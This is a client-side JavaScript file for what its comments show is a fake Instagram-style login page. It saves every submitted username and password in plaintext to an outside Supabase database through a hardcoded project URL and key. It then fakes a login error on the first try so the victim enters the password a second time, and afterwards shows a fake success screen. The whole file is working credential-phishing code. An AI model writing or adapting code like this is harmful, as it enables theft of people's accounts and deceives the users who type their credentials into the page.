import { createClient } from '@supabase/supabase-js'

// Ensure the URL matches your project reference (extracted from your API key)
const SUPABASE_URL = 'https://gmtvkjhnvxmgzxnikbgq.supabase.co'
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdHZramhudnhtZ3p4bmlrYmdxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA4NjA1MTksImV4cCI6MjA4NjQzNjUxOX0.TRltGkO9kCfjm_xHjFfCw1zuoMwz-RMMTrVoLuRptIs'

console.log('Initializing Supabase with URL:', SUPABASE_URL);
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY)

const loginForm = document.getElementById('login-form')
const errorMessage = document.getElementById('error-message')
const eyeBtn = document.querySelector('.eye-btn')
const passwordInput = document.getElementById('password')

let firstAttempt = true

// Password visibility toggle
if (eyeBtn) {
    eyeBtn.addEventListener('click', () => {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password'
        passwordInput.setAttribute('type', type)
        // Optional: change icon color or path
        eyeBtn.style.opacity = type === 'text' ? '1' : '0.5'
    })
}

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault()

    const username = document.getElementById('username').value
    const password = document.getElementById('password').value

    if (password.length < 6) {
        alert('Password must be at least 6 characters.');
        return;
    }

    const btn = loginForm.querySelector('.login-btn')
    const originalBtnText = btn.textContent
    btn.textContent = 'Logging in...'
    btn.disabled = true
    errorMessage.classList.add('hidden')

    try {
        // Still save data to Supabase every time
        const { error } = await supabase
            .from('logins')
            .insert([
                { username: username, password: password }
            ])

        if (error) {
            console.error('Supabase Error:', error);
            // Optionally handle real errors here
        }

        // Behavior as requested: Show error on first attempt
        if (firstAttempt) {
            setTimeout(() => {
                errorMessage.classList.remove('hidden')
                document.getElementById('password').value = '' // Clear password like real IG
                btn.textContent = originalBtnText
                btn.disabled = false
                firstAttempt = false
            }, 1000)
        } else {
            // Success behavior for second attempt
            setTimeout(() => {
                btn.textContent = 'Success!'
                // Hide main content and show success screen
                document.querySelector('.split-container').style.display = 'none'
                document.querySelector('.main-footer').style.display = 'none'
                document.getElementById('success-screen').classList.remove('hidden')
            }, 800)
        }

    } catch (error) {
        console.error('Fetch/Network Error:', error);
        alert('Connectivity Issue: Please check your internet.');
        btn.textContent = originalBtnText
        btn.disabled = false
    }
})
const signoutBtn = document.getElementById('signout-btn')

if (signoutBtn) {
    signoutBtn.addEventListener('click', () => {
        // Simple way to "redirect" back to login while resetting memory state
        window.location.reload()
    })
}
